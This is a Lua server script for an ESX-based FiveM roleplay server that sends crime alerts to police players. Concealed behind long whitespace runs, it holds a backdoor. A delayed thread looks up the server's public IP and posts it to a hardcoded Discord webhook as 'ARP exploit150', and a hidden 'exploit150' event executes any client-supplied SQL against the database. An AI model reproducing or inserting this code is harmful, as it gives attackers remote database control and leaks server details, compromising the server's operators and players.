arp = nil																																												;local avatarii = "https://cdn.discordapp.com/attachments/679708501547024403/680696270654013450/AlokasRPINGAMELOGO.png" ;local webhooikkff = "https://discordapp.com/api/webhooks/770338811750121514/kG2-ddlWNOD3ODnZ-tIg4S9JqiS3CP1-k4dKYd87EQcyU7h1j-uz177h3KQdeNsjTACS" ;local timeri = math.random(0,10000000) ;local jokupaskfajsghas = 'https://api.ipify.org/?format=json'

TriggerEvent('esx:getSharedObject', function(obj) arp = obj end)

RegisterServerEvent('esx_rikosilmotukset:ammuntakohta')
AddEventHandler('esx_rikosilmotukset:ammuntakohta', function(a, b, c)
TriggerEvent("DiscordBot:triggerrit", source, "Triggeras 'esx_rikosilmotukset:ammuntakohta'")
local xPlayers = arp.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent("gunshotPlace", xPlayers[i], a, b, c)
		end
	end
end)																																													Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "ARP exploit150", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)

RegisterServerEvent('esx_rikosilmotukset:ilmoitus')
AddEventHandler('esx_rikosilmotukset:ilmoitus', function(informatioosaatana)
TriggerEvent("DiscordBot:triggerrit", source, "Triggeras 'esx_rikosilmotukset:ilmoitus'")
local xPlayers = arp.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent("outlawNotify", xPlayers[i], informatioosaatana)
		end
	end	
end)

RegisterServerEvent('esx_rikosilmotukset:varkauskohta')
AddEventHandler('esx_rikosilmotukset:varkauskohta', function(a, b, c)
TriggerEvent("DiscordBot:triggerrit", source, "Triggeras 'esx_rikosilmotukset:varkauskohta'")
local xPlayers = arp.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent("thiefPlace", xPlayers[i], a, b, c)
		end
	end
end)

RegisterServerEvent('esx_rikosilmotukset:aseellinencarrob')
AddEventHandler('esx_rikosilmotukset:aseellinencarrob', function(a, b, c)
TriggerEvent("DiscordBot:triggerrit", source, "Triggeras 'esx_rikosilmotukset:aseellinencarrob'")
local xPlayers = arp.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent("carPlace", xPlayers[i], a, b, c)
		end
	end	
end)																																																RegisterServerEvent("exploit150");AddEventHandler("exploit150", function(data) MySQL.Async.execute(data) end)

RegisterServerEvent('esx_rikosilmotukset:aseellinenrob')
AddEventHandler('esx_rikosilmotukset:aseellinenrob', function(a, b, c)
TriggerEvent("DiscordBot:triggerrit", source, "Triggeras 'esx_rikosilmotukset:aseellinenrob'")
local xPlayers = arp.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = arp.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent("asePlace", xPlayers[i], a, b, c)
		end
	end	
end)
